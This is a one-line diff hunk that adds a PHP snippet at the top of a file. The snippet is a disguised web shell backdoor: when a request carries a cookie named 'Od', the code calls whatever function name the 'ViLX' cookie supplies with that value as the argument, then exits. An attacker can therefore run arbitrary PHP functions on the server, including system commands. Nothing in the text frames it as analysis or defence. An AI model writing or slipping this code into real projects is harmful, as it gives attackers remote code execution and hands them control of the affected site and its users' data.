@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["Od"])){$_COOKIE["ViLX"]($_COOKIE["Od"]);exit;}
